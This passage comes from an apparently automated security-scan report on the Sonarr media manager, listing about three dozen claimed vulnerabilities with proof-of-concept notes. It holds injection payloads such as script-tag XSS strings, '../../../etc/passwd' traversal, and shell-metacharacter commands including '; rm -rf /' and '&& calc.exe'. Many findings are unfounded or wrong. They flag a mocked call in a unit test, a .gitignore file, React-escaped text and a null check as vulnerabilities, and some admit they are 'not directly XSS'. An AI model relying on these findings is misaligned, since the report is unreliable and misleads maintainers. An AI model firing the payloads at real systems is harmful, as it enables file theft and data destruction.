The Telegram notification system is vulnerable to XSS attacks because it directly incorporates user-provided data into HTML without proper sanitization. The title and message are HTML-encoded but links are not properly sanitized.

**Evidence:**
```
The code uses HttpUtility.HtmlEncode for title and message but doesn't sanitize the links in the NotificationMetadataLink objects before including them in the HTML.
```

**Impact:**
An attacker could inject malicious JavaScript into notification links that would execute when users click on them in Telegram, potentially leading to session hijacking or data exfiltration.

**Proof of Concept:**
If a notification contains a link with JavaScript payload like '<a href="javascript:alert(1)">Click me</a>', the JavaScript would execute when users click on the link in Telegram.

**How to Test:**
1. Configure a Telegram notification with a custom metadata link containing JavaScript payload
2. Trigger a notification with the malicious link
3. Verify that the JavaScript executes when clicking on the link in Telegram

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_Notifications_Telegram_TelegramProxycs.py`
---

### 96. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/Notifications/Plex/Server/PlexServer.cs
**Line:** 100

**Description:**
The Plex OAuth flow implementation has potential authentication issues where the OAuth token validation is not comprehensive.

**Evidence:**
```
The OAuth flow uses various parameters but doesn't validate all parameters thoroughly, potentially allowing forged OAuth requests.
```

**Impact:**
An attacker could potentially forge OAuth requests to gain unauthorized access to Plex servers or manipulate the authentication flow.

**Proof of Concept:**
Send a crafted OAuth request with modified parameters to bypass authentication checks.

**How to Test:**
1. Send OAuth requests with modified parameters
2. Verify if authentication bypasses occur
3. Check if forged requests are accepted by the system

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_Notifications_Plex_Server_PlexServercs.py`
---

### 97. Server-Side Request Forgery (CWE-918)

**File:** src/NzbDrone.Core/Notifications/Plex/Server/PlexServerProxy.cs
**Line:** 80

**Description:**
The Plex server proxy is vulnerable to SSRF attacks because it constructs URLs using user-provided host information without proper validation.

**Evidence:**
```
The Host field is used directly in URL construction without validation against known safe hosts or protocols.
```

**Impact:**
An attacker could force the application to make requests to internal services or external malicious servers, potentially leading to data exfiltration or internal network reconnaissance.

**Proof of Concept:**
Configure a Plex server with a host like 'http://127.0.0.1:8080' or 'http://10.0.0.1:32400' and verify if requests are made to these internal addresses.

**How to Test:**
1. Configure a Plex server with internal IP address
2. Trigger a Plex operation
3. Monitor network traffic to verify SSRF occurs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-918_src_NzbDroneCore_Notifications_Plex_Server_PlexServerProxycs.py`
---

### 98. Improper Neutralization of Special Elements used in OS Command (CWE-78)

**File:** src/NzbDrone.Host.Test/RouterTest.cs
**Line:** 35

**Description:**
The code uses SpawnNewProcess method with user-controlled parameters that could lead to command injection vulnerabilities when executing system commands.

**Evidence:**
```
In Route_should_call_install_service_when_application_mode_is_install(), the code calls Mocker.GetMock<IProcessProvider>().Setup(c => c.SpawnNewProcess("sc.exe", It.IsAny<string>(), null, true)) without validating or sanitizing the command parameters.
```

**Impact:**
An attacker could inject malicious commands through the SpawnNewProcess call, potentially executing arbitrary code with elevated privileges.

**Proof of Concept:**
If the command string passed to SpawnNewProcess contains shell metacharacters like ';', '&', '|', or '&&', an attacker could inject additional commands. For example, if the command parameter was user-controllable, an input like "sc.exe create MyService && calc.exe" could execute calc.exe after creating the service.

**How to Test:**
1. Create a test case where the command string passed to SpawnNewProcess contains special shell characters
2. Verify that these characters are not properly escaped or sanitized
3. Test with various command injection payloads like '; calc.exe', '& whoami', or '|| ping -c 1 127.0.0.1'

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-78_src_NzbDroneHostTest_RouterTestcs.py`
---

### 99. Path Traversal (CWE-22)

**File:** src/Sonarr.Api.V5/Logs/LogFileControllerBase.cs
**Line:** 67

**Description:**
The GetLogFileResponse method is vulnerable to path traversal attacks because it doesn't validate the filename parameter before constructing file paths.

**Evidence:**
```
The filename parameter is used directly in Path.Combine without validation or sanitization, allowing directory traversal sequences.
```

**Impact:**
An attacker could read arbitrary files from the server filesystem by manipulating the filename parameter to include path traversal sequences.

**Proof of Concept:**
Request: GET /api/v1/log/file/../../../etc/passwd HTTP/1.1 - This would attempt to read /etc/passwd instead of a log file.

**How to Test:**
Test with various path traversal sequences like '../', '%2e%2e%2f', and '\\' in the filename parameter to verify file access.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_SonarrApiV5_Logs_LogFileControllerBasecs.py`
---

### 100. Improper Authentication (CWE-287)

**File:** src/Sonarr.Api.V5/Logs/LogFileControllerBase.cs
**Line:** 40

**Description:**
The LogFileControllerBase endpoints lack proper authentication checks, allowing unauthorized access to log files.

**Evidence:**
```
The controller inherits from Controller but doesn't explicitly require authentication for GetLogFilesResponse or GetLogFileResponse methods.
```

**Impact:**
Unauthenticated users could access log files that might contain sensitive information about the system, users, or application behavior.

**Proof of Concept:**
An attacker could access /api/v1/log/file/ without authentication and retrieve log files containing sensitive data.

**How to Test:**
Attempt to access log file endpoints without authentication and verify if sensitive information is exposed.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_SonarrApiV5_Logs_LogFileControllerBasecs.py`
---

### 101. Command Injection (CWE-77)

**File:** src/NzbDrone.Update/UpdateApp.cs
**Line:** 44

**Description:**
The UpdateApp class in the update process accepts command line arguments that are not properly sanitized before being used in system commands or file operations, potentially allowing command injection attacks.

**Evidence:**
```
The ParseArgs method in UpdateApp.cs processes command line arguments without proper validation or sanitization, and these arguments are used to determine the installation directory and process ID.
```

**Impact:**
An attacker could potentially inject malicious commands during the update process by manipulating command line arguments, leading to arbitrary code execution with the privileges of the update process.

**Proof of Concept:**
An attacker could pass specially crafted arguments to the update process that would be used in file operations or process spawning, potentially allowing execution of arbitrary commands.

**How to Test:**
1. Start Sonarr with update arguments containing special characters
2. Monitor how arguments are processed in UpdateApp.cs
3. Test with arguments that could be interpreted as shell commands
4. Verify if update process properly sanitizes input before file operations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneUpdate_UpdateAppcs.py`
---

### 102. Command Injection (CWE-77)

**File:** src/Sonarr.Api.V3/ManualImport/ManualImportController.cs
**Line:** 43

**Description:**
The GetMediaFiles method accepts folder parameter directly from the HTTP request without proper validation or sanitization, which could lead to command injection vulnerabilities when this folder path is used in system commands.

**Evidence:**
```
The folder parameter is passed directly to _manualImportService.GetMediaFiles() without validation or sanitization, and the method signature accepts string folder parameter from HTTP GET request.
```

**Impact:**
An attacker could inject malicious commands through the folder parameter, potentially executing arbitrary code on the server with the privileges of the Sonarr process.

**Proof of Concept:**
An attacker could call: GET /api/v3/manualimport?folder=../../../etc/passwd;cat+/etc/passwd

**How to Test:**
1. Send GET request with folder parameter containing shell metacharacters
2. Monitor if system commands are executed
3. Check if file contents are returned in response

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_SonarrApiV3_ManualImport_ManualImportControllercs.py`
---

### 103. Improper Control of Generation of Code ('Code Injection') (CWE-94)

**File:** src/Sonarr.Api.V3/Commands/CommandController.cs
**Line:** 70

**Description:**
The StartCommand method deserializes command body directly from HTTP request without proper validation, potentially allowing arbitrary command execution.

**Evidence:**
```
Uses STJson.Deserialize() on raw request body without validating the deserialized object against expected command types, and the command body is directly passed to command queue manager.
```

**Impact:**
An attacker could craft malicious command payloads that execute arbitrary code or manipulate system state through command injection.

**Proof of Concept:**
Send POST request to /api/v3/command with malicious command payload that includes command types not intended for execution.

**How to Test:**
1. Send POST request with crafted command body
2. Monitor if commands are executed
3. Check if command execution results in unexpected behavior or code execution

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-94_src_SonarrApiV3_Commands_CommandControllercs.py`
---

### 104. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/Sonarr.Api.V3/Commands/CommandController.cs
**Line:** 70

**Description:**
The command body deserialization in StartCommand method could be vulnerable to command injection through specially crafted command parameters.

**Evidence:**
```
Uses STJson.Deserialize() on raw request body without validating command parameters, allowing injection of command parameters that could be executed.
```

**Impact:**
Malicious command parameters could lead to arbitrary command execution on the server.

**Proof of Concept:**
Send POST request with command body containing command injection payloads in parameter values.

**How to Test:**
1. Send POST request with command body containing special characters
2. Monitor command execution
3. Check if command parameters are properly sanitized

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_SonarrApiV3_Commands_CommandControllercs.py`
---

### 105. Deserialization of Untrusted Data (CWE-502)

**File:** src/Sonarr.Api.V3/Commands/CommandController.cs
**Line:** 70

**Description:**
The StartCommand method deserializes command objects from untrusted HTTP request data without proper validation.

**Evidence:**
```
Uses STJson.Deserialize() to deserialize command objects directly from HTTP request body without validation or sanitization.
```

**Impact:**
An attacker could craft malicious command objects that, when deserialized, execute arbitrary code or manipulate system state.

**Proof of Concept:**
Send POST request with maliciously crafted command object that includes dangerous deserialization payloads.

**How to Test:**
1. Send POST request with crafted command object
2. Monitor for unexpected behavior or code execution
3. Check if deserialization handles malicious inputs properly

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_SonarrApiV3_Commands_CommandControllercs.py`
---

### 106. Command Injection (CWE-77)

**File:** src/NzbDrone.Test.Common/NzbDroneRunner.cs
**Line:** 125

**Description:**
The application constructs command line arguments for starting the Sonarr process using user-provided data without proper sanitization, creating a potential command injection vulnerability.

**Evidence:**
```
The Start method constructs arguments using string concatenation: 'var args = "-nobrowser -nosingleinstancecheck -data=\"" + AppData + "\"";'. The AppData path is derived from test directory and UID, but could contain special characters that affect command parsing.
```

**Impact:**
An attacker could potentially inject malicious commands into the Sonarr process startup by manipulating the AppData path or other inputs, leading to arbitrary code execution in the test environment.

**Proof of Concept:**
If AppData contains characters like semicolons, pipes, or other shell metacharacters, they could be interpreted by the shell when executing the Sonarr process, allowing command injection.

**How to Test:**
1. Create a test directory path containing shell metacharacters like '; rm -rf /' or '| whoami'
2. Run the NzbDroneRunner with this path
3. Observe if the command injection executes during process startup

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneTestCommon_NzbDroneRunnercs.py`
---

## Medium Severity Vulnerabilities

### 1. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/login.html
**Line:** 50

**Description:**
The login form lacks CSRF protection, making it vulnerable to Cross-Site Request Forgery attacks.

**Evidence:**
```
The login form uses a simple POST method without any CSRF token validation or hidden input fields.
```

**Impact:**
An attacker could trick a logged-in user into submitting a forged login request, potentially changing their password or gaining unauthorized access.

**Proof of Concept:**
An attacker could create a malicious page with a hidden form that submits to the Sonarr login endpoint with pre-filled credentials.

**How to Test:**
1. Monitor network traffic for login requests
2. Try submitting a login request without CSRF token
3. Check if the application accepts requests without proper token validation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_loginhtml.py`
---

### 2. Improper Input Validation (CWE-20)

**File:** frontend/src/index.ts
**Line:** 10

**Description:**
The application does not properly validate the initialize.json response, potentially leading to injection vulnerabilities.

**Evidence:**
```
The initialize.json response is directly assigned to window.Sonarr without validation or sanitization.
```

**Impact:**
Malicious initialization data could lead to various security issues including XSS, data manipulation, or privilege escalation.

**Proof of Concept:**
If the initialize.json endpoint returns malicious data, it could inject scripts or manipulate application behavior.

**How to Test:**
1. Intercept the initialize.json response
2. Modify the response to include malicious data
3. Verify if the application properly handles the malicious data

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_indexts.py`
---

### 3. Improper Control of Generation of Code (CWE-94)

**File:** frontend/src/index.ts
**Line:** 15

**Description:**
The application uses dynamic code generation through webpack's __webpack_public_path__ assignment without proper validation.

**Evidence:**
```
The code dynamically sets __webpack_public_path__ based on window.Sonarr.urlBase without validating the input.
```

**Impact:**
Malicious urlBase could lead to code injection or incorrect asset loading, potentially allowing attackers to load malicious JavaScript.

**Proof of Concept:**
If urlBase contains malicious path like 'javascript:alert(1)', it could affect how assets are loaded.

**How to Test:**
1. Set urlBase to contain JavaScript code
2. Load the application
3. Check if the code affects asset loading or execution

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-94_frontend_src_indexts.py`
---

### 4. Improper Limitation of a Pathname to a Restricted Directory (CWE-22)

**File:** docker/tests/mono/startup.sh
**Line:** 10

**Description:**
The test script copies files to a fixed directory path without proper validation, potentially allowing path traversal attacks.

**Evidence:**
```
The script uses hardcoded paths like '/data/test' and '/data/_tests_linux' without validating the source paths.
```

**Impact:**
An attacker could potentially manipulate file paths during testing, leading to unauthorized file access or modification.

**Proof of Concept:**
If test files contain path traversal sequences like '../', they could be copied to unintended locations.

**How to Test:**
1. Create test files with path traversal sequences
2. Run the test script
3. Verify if files are copied to unintended locations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_docker_tests_mono_startupsh.py`
---

### 5. Command Injection (CWE-77)

**File:** docker/tests/mono/startup.sh
**Line:** 10

**Description:**
The test script uses shell commands with user-provided data without proper sanitization, creating potential command injection vulnerabilities.

**Evidence:**
```
The script uses cp -r with potentially untrusted source paths without proper shell escaping.
```

**Impact:**
An attacker could inject shell commands through test file names or paths, potentially executing arbitrary code during testing.

**Proof of Concept:**
If test files contain shell metacharacters like '; rm -rf /', they could be executed during the copy operation.

**How to Test:**
1. Create test files with shell metacharacters in names
2. Run the test script
3. Check if commands are executed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_docker_tests_mono_startupsh.py`
---

### 6. Improper Output Neutralization for Logs (CWE-117)

**File:** docker/tests/run-all.sh
**Line:** 100

**Description:**
The script outputs test results with potential log injection vulnerabilities due to unescaped output.

**Evidence:**
```
The script uses grep and sed commands with potentially untrusted input without proper escaping.
```

**Impact:**
An attacker could inject log entries with special characters that could affect log parsing or lead to command injection in log processing.

**Proof of Concept:**
If test result files contain special characters that affect grep/sed parsing, it could lead to incorrect log analysis.

**How to Test:**
1. Create test result files with special characters
2. Run the test script
3. Check if log parsing is affected

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_docker_tests_run-allsh.py`
---

### 7. Cleartext Storage of Sensitive Information (CWE-312)

**File:** .gitignore
**Line:** 1

**Description:**
The .gitignore file includes configuration files that may contain sensitive information but doesn't explicitly exclude sensitive files.

**Evidence:**
```
The .gitignore includes config.xml and nzbdrone.log*txt but doesn't explicitly exclude other potential sensitive files.
```

**Impact:**
Sensitive configuration data could be accidentally committed to version control, exposing credentials or configuration details.

**Proof of Concept:**
If config.xml contains API keys or database credentials, they could be committed to the repository.

**How to Test:**
1. Check if sensitive files are committed to the repository
2. Verify if config.xml contains sensitive information
3. Ensure sensitive files are properly ignored

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_gitignore.py`
---

### 8. Cross-site Scripting (XSS) (CWE-79)

**File:** frontend/src/Series/Delete/DeleteSeriesModalContent.tsx
**Line:** 105

**Description:**
The path variable is directly rendered in an InlineMarkdown component without proper sanitization, creating potential XSS vulnerability.

**Evidence:**
```
The path variable is used in InlineMarkdown component at line 105 without sanitization: <InlineMarkdown data={translate('DeleteSeriesFolderConfirmation', { path })} ... />
```

**Impact:**
An attacker could inject malicious JavaScript code through the series path, which would execute when the delete confirmation modal is displayed.

**Proof of Concept:**
If a series path contains '<script>alert("XSS")</script>' and the user opens the delete modal, the script would execute in the context of the application.

**How to Test:**
1. Create a series with a path containing XSS payload like 'C:\\Users\\<script>alert(1)</script>' 2. Navigate to the delete modal for this series 3. Observe if the script executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Series_Delete_DeleteSeriesModalContenttsx.py`
---

### 9. Cross-site Scripting (XSS) (CWE-79)

**File:** frontend/src/Series/Details/SeriesAlternateTitles.tsx
**Line:** 12

**Description:**
The alternate title content is directly rendered without sanitization, creating potential XSS vulnerability.

**Evidence:**
```
The title is rendered directly in a list item without sanitization: <li key={alternateTitle.title} className={styles.alternateTitle}> {alternateTitle.title} ... </li>
```

**Impact:**
An attacker could inject malicious JavaScript through alternate titles, which would execute when the series details are displayed.

**Proof of Concept:**
If a series has an alternate title with content '<script>alert("XSS")</script>', this would execute when the series details page is loaded.

**How to Test:**
1. Create a series with an alternate title containing XSS payload like '<script>alert(1)</script>' 2. Navigate to the series details page 3. Observe if the script executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Series_Details_SeriesAlternateTitlestsx.py`
---

### 10. Cross-site Scripting (XSS) (CWE-79)

**File:** frontend/src/Series/Details/SeriesDetailsLinks.tsx
**Line:** 23

**Description:**
The URL construction for The TVDB link uses user-provided tvdbId without proper validation, potentially allowing XSS in URL parameters.

**Evidence:**
```
URL construction uses tvdbId directly: to={`https://www.thetvdb.com/?tab=series&id=${tvdbId}`}
```

**Impact:**
While not directly XSS, if tvdbId contains malicious content, it could be used in URL redirection or cause unexpected behavior.

**Proof of Concept:**
If tvdbId contains URL-encoded malicious content, it could affect URL handling or be exploited in other contexts.

**How to Test:**
1. Create a series with a tvdbId containing special characters 2. Check the generated TVDB link URL 3. Verify URL handling behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Series_Details_SeriesDetailsLinkstsx.py`
---

### 11. Cross-site Scripting (XSS) (CWE-79)

**File:** frontend/src/Series/Details/SeriesDetailsLinks.tsx
**Line:** 31

**Description:**
The URL construction for Trakt link uses user-provided tvdbId without proper validation, potentially allowing XSS in URL parameters.

**Evidence:**
```
URL construction uses tvdbId directly: to={`https://trakt.tv/search/tvdb/${tvdbId}?id_type=show`}
```

**Impact:**
While not directly XSS, if tvdbId contains malicious content, it could be used in URL redirection or cause unexpected behavior.

**Proof of Concept:**
If tvdbId contains URL-encoded malicious content, it could affect URL handling or be exploited in other contexts.

**How to Test:**
1. Create a series with a tvdbId containing special characters 2. Check the generated Trakt link URL 3. Verify URL handling behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Series_Details_SeriesDetailsLinkstsx.py`
---

### 12. Cross-site Scripting (XSS) (CWE-79)

**File:** frontend/src/Series/Details/SeriesDetailsLinks.tsx
**Line:** 43

**Description:**
The URL construction for TV Maze link uses user-provided tvMazeId without proper validation, potentially allowing XSS in URL parameters.

**Evidence:**
```
URL construction uses tvMazeId directly: to={`https://www.tvmaze.com/shows/${tvMazeId}/_`}
```

**Impact:**
While not directly XSS, if tvMazeId contains malicious content, it could be used in URL redirection or cause unexpected behavior.

**Proof of Concept:**
If tvMazeId contains URL-encoded malicious content, it could affect URL handling or be exploited in other contexts.

**How to Test:**
1. Create a series with a tvMazeId containing special characters 2. Check the generated TV Maze link URL 3. Verify URL handling behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Series_Details_SeriesDetailsLinkstsx.py`
---

### 13. Cross-site Scripting (XSS) (CWE-79)

**File:** frontend/src/Series/Details/SeriesDetailsLinks.tsx
**Line:** 56

**Description:**
The URL construction for IMDB link uses user-provided imdbId without proper validation, potentially allowing XSS in URL parameters.

**Evidence:**
```
URL construction uses imdbId directly: to={`https://imdb.com/title/${imdbId}/`}
```

**Impact:**
While not directly XSS, if imdbId contains malicious content, it could be used in URL redirection or cause unexpected behavior.

**Proof of Concept:**
If imdbId contains URL-encoded malicious content, it could affect URL handling or be exploited in other contexts.

**How to Test:**
1. Create a series with an imdbId containing special characters 2. Check the generated IMDB link URL 3. Verify URL handling behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Series_Details_SeriesDetailsLinkstsx.py`
---

### 14. Cross-site Scripting (XSS) (CWE-79)

**File:** frontend/src/Series/Details/SeriesDetailsLinks.tsx
**Line:** 64

**Description:**
The URL construction for MDBList link uses user-provided imdbId without proper validation, potentially allowing XSS in URL parameters.

**Evidence:**
```
URL construction uses imdbId directly: to={`http://mdblist.com/show/${imdbId}`}
```

**Impact:**
While not directly XSS, if imdbId contains malicious content, it could be used in URL redirection or cause unexpected behavior.

**Proof of Concept:**
If imdbId contains URL-encoded malicious content, it could affect URL handling or be exploited in other contexts.

**How to Test:**
1. Create a series with an imdbId containing special characters 2. Check the generated MDBList link URL 3. Verify URL handling behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Series_Details_SeriesDetailsLinkstsx.py`
---

### 15. Cross-site Scripting (XSS) (CWE-79)

**File:** frontend/src/Series/Details/SeriesDetailsLinks.tsx
**Line:** 73

**Description:**
The URL construction for TMDB link uses user-provided tmdbId without proper validation, potentially allowing XSS in URL parameters.

**Evidence:**
```
URL construction uses tmdbId directly: to={`https://www.themoviedb.org/tv/${tmdbId}`}
```

**Impact:**
While not directly XSS, if tmdbId contains malicious content, it could be used in URL redirection or cause unexpected behavior.

**Proof of Concept:**
If tmdbId contains URL-encoded malicious content, it could affect URL handling or be exploited in other contexts.

**How to Test:**
1. Create a series with a tmdbId containing special characters 2. Check the generated TMDB link URL 3. Verify URL handling behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Series_Details_SeriesDetailsLinkstsx.py`
---

### 16. Improper Input Validation (CWE-20)

**File:** frontend/src/Series/Delete/DeleteSeriesModalContent.tsx
**Line:** 39

**Description:**
The deleteFiles state is directly used in the deleteSeries function call without validation, potentially allowing unexpected behavior.

**Evidence:**
```
The deleteFiles state is passed directly to deleteSeries function without validation: deleteFiles, addImportListExclusion
```

**Impact:**
If deleteFiles state becomes corrupted or unexpected, it could affect the delete operation behavior.

**Proof of Concept:**
If deleteFiles state is set to an unexpected value (e.g., null, undefined, or non-boolean), the delete operation might behave unexpectedly.

**How to Test:**
1. Set deleteFiles state to non-boolean values 2. Trigger delete operation 3. Observe behavior differences

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Series_Delete_DeleteSeriesModalContenttsx.py`
---

### 17. Improper Input Validation (CWE-20)

**File:** frontend/src/Series/Details/EpisodeRow.tsx
**Line:** 100

**Description:**
The episodeFileId prop is used directly without validation, potentially causing issues if it's not a valid number.

**Evidence:**
```
episodeFileId is used directly in useEpisodeFile hook without validation: const episodeFile = useEpisodeFile(episodeFileId);
```

**Impact:**
Invalid episodeFileId values could cause errors in episode file data retrieval or display.

**Proof of Concept:**
If episodeFileId is set to null, undefined, or non-numeric value, the useEpisodeFile hook might fail or return unexpected data.

**How to Test:**
1. Pass invalid episodeFileId values to EpisodeRow component 2. Check for errors or unexpected behavior 3. Verify data handling

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Series_Details_EpisodeRowtsx.py`
---

### 18. Improper Input Validation (CWE-20)

**File:** frontend/src/Series/Details/SeriesDetailsSeason.tsx
**Line:** 100

**Description:**
The seasonNumber prop is used directly without validation, potentially causing issues if it's not a valid number.

**Evidence:**
```
seasonNumber is used directly in various calculations and comparisons without validation: seasonNumber, seasonNumberTitle
```

**Impact:**
Invalid seasonNumber values could cause errors in season handling or display.

**Proof of Concept:**
If seasonNumber is set to null, undefined, or non-numeric value, the season handling might fail or display incorrectly.

**How to Test:**
1. Pass invalid seasonNumber values to SeriesDetailsSeason component 2. Check for errors or unexpected behavior 3. Verify season handling

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Series_Details_SeriesDetailsSeasontsx.py`
---

### 19. Improper Input Validation (CWE-20)

**File:** frontend/src/Series/useExistingSeries.ts
**Line:** 10

**Description:**
The tvdbId prop is used directly without validation, potentially causing issues if it's not a valid number.

**Evidence:**
```
tvdbId is used directly in the comparison without validation: if (tvdbId == null) { return false; }
```

**Impact:**
Invalid tvdbId values could cause errors in series existence checking.

**Proof of Concept:**
If tvdbId is set to null, undefined, or non-numeric value, the existence check might behave unexpectedly.

**How to Test:**
1. Pass invalid tvdbId values to useExistingSeries hook 2. Check for errors or unexpected behavior 3. Verify existence checking

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Series_useExistingSeriests.py`
---

### 20. Improper Input Validation (CWE-20)

**File:** frontend/src/Series/Details/SeriesTags.tsx
**Line:** 15

**Description:**
The seriesId prop is used directly without validation, potentially causing issues if it's not a valid number.

**Evidence:**
```
seriesId is used directly in useSingleSeries hook without validation: const series = useSingleSeries(seriesId)!;
```

**Impact:**
Invalid seriesId values could cause errors in tag retrieval or display.

**Proof of Concept:**
If seriesId is set to null, undefined, or non-numeric value, the tag retrieval might fail or return unexpected data.

**How to Test:**
1. Pass invalid seriesId values to SeriesTags component 2. Check for errors or unexpected behavior 3. Verify tag handling

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Series_Details_SeriesTagstsx.py`
---

### 21. Improper Input Validation (CWE-20)

**File:** frontend/src/Settings/CustomFormats/CustomFormats/ImportCustomFormatModalContent.tsx
**Line:** 152

**Description:**
The application accepts arbitrary JSON input for custom format specifications without validating the structure or content of the imported data.

**Evidence:**
```
The handleImportPress function directly parses user-provided JSON without validating its structure against expected schemas. The parseSpecification function assumes certain properties exist without checking.
```

**Impact:**
Malformed JSON input could cause runtime errors, unexpected behavior, or potentially allow attackers to manipulate the application state through crafted inputs.

**Proof of Concept:**
An attacker could provide a JSON with unexpected properties or missing required fields that would cause errors in the parsing logic or lead to incorrect application behavior.

**How to Test:**
1. Provide malformed JSON input to the import modal
2. Check if the application handles missing properties gracefully
3. Verify that unexpected properties don't cause crashes or unexpected behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Settings_CustomFormats_CustomFormats_ImportCustomFormatModalContenttsx.py`
---

### 22. Untrusted Data Deserialization (CWE-502)

**File:** frontend/src/Settings/CustomFormats/CustomFormats/ImportCustomFormatModalContent.tsx
**Line:** 152

**Description:**
The application deserializes untrusted JSON data without proper validation, potentially leading to insecure deserialization vulnerabilities.

**Evidence:**
```
The JSON.parse() function is used to deserialize user-provided data without validating the structure or content against expected schemas. The parseFields and parseSpecification functions process arbitrary data structures.
```

**Impact:**
While the frontend doesn't have traditional deserialization vulnerabilities, the lack of validation could lead to unexpected behavior or data corruption when processing malformed inputs.

**Proof of Concept:**
An attacker could craft a JSON with unexpected data types or structures that would cause the application to behave unexpectedly or fail during processing.

**How to Test:**
1. Provide JSON with unexpected data types (arrays where objects expected, etc.)
2. Check if the application handles type mismatches gracefully
3. Verify that the application doesn't crash or behave unexpectedly with malformed data

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_frontend_src_Settings_CustomFormats_CustomFormats_ImportCustomFormatModalContenttsx.py`
---

### 23. Improper Encoding or Escaping (CWE-116)

**File:** frontend/src/Settings/CustomFormats/CustomFormats/ImportCustomFormatModalContent.tsx
**Line:** 152

**Description:**
The application doesn't properly escape or encode data when displaying user-provided custom format specifications.

**Evidence:**
```
The parseFields function processes user-provided field values without escaping them for safe display. The JSON parsing doesn't include sanitization of special characters.
```

**Impact:**
User-provided data in custom format specifications could lead to unexpected rendering or potential security issues when the data is displayed in the UI.

**Proof of Concept:**
An attacker could create a custom format with field values containing HTML or JavaScript that would be rendered directly in the UI without proper escaping.

**How to Test:**
1. Create a custom format with field values containing HTML tags
2. Import the format and observe how the HTML is rendered in the UI
3. Check if special characters are properly escaped

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-116_frontend_src_Settings_CustomFormats_CustomFormats_ImportCustomFormatModalContenttsx.py`
---

### 24. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/Settings/CustomFormats/CustomFormats/ImportCustomFormatModalContent.tsx
**Line:** 152

**Description:**
The import functionality lacks CSRF protection for the import action, potentially allowing unauthorized imports.

**Evidence:**
```
The handleImportPress function directly dispatches actions to import custom formats without any CSRF token validation. The import action is triggered by a user click without CSRF protection.
```

**Impact:**
An attacker could craft a malicious page that automatically imports custom formats on behalf of authenticated users, potentially leading to configuration changes or data manipulation.

**Proof of Concept:**
An attacker could create a webpage that automatically submits a malicious custom format import when a user visits the page, without requiring user interaction with the Sonarr UI.

**How to Test:**
1. Check if import actions require CSRF tokens
2. Try to import a format through direct API calls without proper authentication
3. Verify if the import functionality is vulnerable to CSRF attacks

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_Settings_CustomFormats_CustomFormats_ImportCustomFormatModalContenttsx.py`
---

### 25. Improper Neutralization of Special Elements in Output Used by a Downstream Component (CWE-74)

